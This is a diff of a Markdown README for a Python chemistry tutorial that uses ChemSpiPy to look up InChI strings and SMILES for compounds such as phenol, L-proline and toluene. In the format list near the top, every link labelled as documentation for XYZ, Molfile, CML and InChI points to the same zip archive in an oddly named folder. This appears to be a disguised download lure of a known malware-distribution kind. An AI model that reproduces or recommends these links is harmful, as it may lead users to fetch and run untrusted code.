@@ -17,11 +17,14 @@ In research and education, computers and internet have been widely adopted. Ther
 3.  _XYZ_ [`XYZ-py`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
 
 4. _Molfile_ [`MDL Molfile`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
+
 5. _Chemical Markup Language format based on Extensible Markup Language_ [`XML-based formats`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
 
 6. _InChI and InChIkey_ [`The international Chemical Identifier`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
 
+
 # Online Database
+
 There are several free online service and database that can be searched for information about chemical compounds. 
 
 1. _Wikipedia_ [`wikipedia.org`](https://en.wikipedia.org/wiki/List_of_chemical_databases)
@@ -36,7 +39,7 @@ ChemSpiPy is a Python library that interact with the ChemSpider API. It allow ch
 
 Deduces the srtucture of the following molecules from their  InChi strings:
 
-[![Standard InChI](https://chem.libretexts.org/@api/deki/files/202932/InChI%252BLayers.JPG?revision=1)](https://chem.libretexts.org/Courses/Fordham_University/Chem1102%3A_Drug_Discovery_-_From_the_Laboratory_to_the_Clinic/05%3A_Organic_Molecules/5.08%3A_Line_Notation_(SMILES_and_InChI))
+[![Standard InChI](https://www.inchi-trust.org/wp/wp-content/uploads/2022/12/InChI-KEY-1536x546.png)](https://www.inchi-trust.org/about-the-inchi-standard/)
 
 
 1. InChI=1S/C6H60/c7-6-4-2-1-3-5-6/h1-5,7H
@@ -46,7 +49,7 @@ Deduces the srtucture of the following molecules from their  InChi strings:
 
 __Hint__: the notation (H,7,8) means that a single hydrogen atom is shared by atoms 7 and 8. 
 
-```python
+```Python
 from chemspipy import ChemSpider
 cs = ChemSpider('YOUR_API-KEY')
 
@@ -71,7 +74,8 @@ InChI: InChI=1S/C6H6O/c7-6-4-2-1-3-5-6/h1-5,7H
 InChI Key: ISWSIDIOOBJBQZ-UHFFFAOYSA-N
 SMILES: Oc1ccccc1
 ```
-```python
+
+```Python
 from chemspipy import ChemSpider
 cs = ChemSpider('YOUR_API-KEY')
 
@@ -87,6 +91,7 @@ print('InChI:', c.inchi)
 print('InChI Key:', c.inchikey)
 print('SMILES:', c.smiles)
 ```
+
 ```
 2 Common Name: 2-Methylbutan-1-ol
 ChemSpider ID: 8398
@@ -96,7 +101,8 @@ InChI: InChI=1S/C5H12O/c1-3-5(2)4-6/h5-6H,3-4H2,1-2H3
 InChI Key: QPRQEDXDYOZYLA-UHFFFAOYSA-N
 SMILES: CCC(C)CO
 ```
-```python
+
+```Python
 from chemspipy import ChemSpider
 cs = ChemSpider('YOUR_API-KEY')
 
@@ -112,6 +118,7 @@ print('InChI:', c.inchi)
 print('InChI Key:', c.inchikey)
 print('SMILES:', c.smiles)
 ```
+
 ```
 3 Common Name: Methylcyclopentene
 ChemSpider ID: 12222
@@ -120,8 +127,9 @@ Molecular Weight: 82.146
 InChI: InChI=1S/C6H10/c1-6-4-2-3-5-6/h4H,2-3,5H2,1H3
 InChI Key: ATQUFXWBVZUTKO-UHFFFAOYSA-N
 SMILES: CC1=CCCC1
+
 ```
-```python
+```Python
 from chemspipy import ChemSpider
 cs = ChemSpider('YOUR_API-KEY')
 
@@ -137,6 +145,7 @@ print('InChI:', c.inchi)
 print('InChI Key:', c.inchikey)
 print('SMILES:', c.smiles)
 ```
+
 ```
 4 Common Name: L-Proline
 ChemSpider ID: 128566
@@ -149,6 +158,7 @@ SMILES: O=C(O)[C@@H]1CCCN1
 
 
 # P8.2- SMILES 
+
 The simplified Molecular-Input Line-Entry System (SMILES) represents chemical species as short, plain text (ASCII) strings. This SMILES specification is divided into two distinct parts: A __syntactic specification__ specifies how the atoms, bonds, parentheses, digits, and so forth are represented, and a __Semantic SPecification__ that describes how those symbols are interpreted as a sensible molecule.
 
 __The function and arguments:__
@@ -160,7 +170,9 @@ __The function and arguments:__
 - `strict = True`
 
 Write the SMILES strings for the following molecules:
+
 1. Toulena, Ph-CH3
+
 2. The trans fatty acid, vaccenic acid:
    
    ![Fatty Acid](https://pubchem.ncbi.nlm.nih.gov/image/imgsrv.fcgi?cid=5281127&t=l)
@@ -175,7 +187,7 @@ Write the SMILES strings for the following molecules:
    
    ![Bicyclo[4.3.0]nonane](https://webbook.nist.gov/cgi/cbook.cgi?Struct=R524448&Type=Color)
 
-```python
+```Python
 from chemspipy import ChemSpider
 cs = ChemSpider('YOUR_API-KEY')
 
@@ -195,6 +207,7 @@ print('SMILES D-Limonene,:', c.smiles)
 C = cs.get_compound(10459)
 print('SMILES bycylo[4.3.0]nonane,:', c.smiles)
 ```
+
 ```
 
 SMILES Toluena: Cc1ccccc1
